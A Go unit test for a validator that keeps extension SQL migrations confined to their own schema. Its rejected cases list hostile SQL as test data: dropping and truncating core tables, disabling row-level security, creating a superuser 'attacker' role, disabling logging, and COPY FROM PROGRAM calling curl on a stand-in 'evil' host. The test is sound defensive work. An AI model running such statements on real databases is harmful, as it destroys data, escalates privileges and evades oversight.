package sql

import "testing"

func TestValidateExtensionMigrationContainment(t *testing.T) {
	allowed := map[string]string{
		"create in own schema": `CREATE TABLE ${SCHEMA_NAME}.issues (id uuid primary key);`,
		"foreign key to core": `CREATE TABLE ${SCHEMA_NAME}.issues (
			id uuid primary key,
			workspace_id uuid NOT NULL REFERENCES core_platform.workspaces(id)
		);`,
		"read from core in a seed": `INSERT INTO ${SCHEMA_NAME}.queues (id, name)
			SELECT id, name FROM core_service.case_queues;`,
		"index and comment": `-- drop table core_service.cases would be dangerous but this is a comment
			CREATE INDEX idx_issues ON ${SCHEMA_NAME}.issues (workspace_id);`,
		"dollar quoted body mentioning core": `CREATE FUNCTION ${SCHEMA_NAME}.f() RETURNS void AS $$
			BEGIN
				-- the string core_service.cases here must not trip the scanner
				RAISE NOTICE 'core_service.cases';
			END;
			$$ LANGUAGE plpgsql;`,
	}
	for name, sql := range allowed {
		t.Run("allow/"+name, func(t *testing.T) {
			if err := validateExtensionMigrationContainment(sql); err != nil {
				t.Fatalf("expected allowed, got error: %v", err)
			}
		})
	}

	rejected := map[string]string{
		"drop core table":        `DROP TABLE core_service.cases;`,
		"drop core if exists":    `DROP TABLE IF EXISTS core_platform.workspaces;`,
		"alter core disable rls": `ALTER TABLE core_platform.workspaces DISABLE ROW LEVEL SECURITY;`,
		"truncate core":          `TRUNCATE core_service.cases;`,
		"delete from core":       `DELETE FROM core_platform.workspaces WHERE true;`,
		"update core":            `UPDATE core_platform.workspaces SET name = 'x';`,
		"insert into core":       `INSERT INTO core_service.cases (id) VALUES (gen_random_uuid());`,
		"drop public table":      `DROP TABLE public.schema_migrations;`,
		"grant privileges":       `GRANT ALL ON ALL TABLES IN SCHEMA core_platform TO PUBLIC;`,
		"revoke":                 `REVOKE SELECT ON core_platform.workspaces FROM someone;`,
		"create role":            `CREATE ROLE attacker SUPERUSER;`,
		"set role":               `SET ROLE postgres;`,
		"alter system":           `ALTER SYSTEM SET log_statement = 'none';`,
		"copy from program":      `COPY ${SCHEMA_NAME}.t FROM PROGRAM 'curl http://evil';`,
		"security definer":       `CREATE FUNCTION ${SCHEMA_NAME}.f() RETURNS void SECURITY DEFINER AS $$ SELECT 1 $$ LANGUAGE sql;`,
		"create extension":       `CREATE EXTENSION plpython3u;`,
		"hidden in real stmt":    "CREATE TABLE ${SCHEMA_NAME}.t (id int);\nDROP TABLE core_service.cases;",
	}
	for name, sql := range rejected {
		t.Run("reject/"+name, func(t *testing.T) {
			if err := validateExtensionMigrationContainment(sql); err == nil {
				t.Fatalf("expected rejection, got nil for: %s", sql)
			}
		})
	}
}
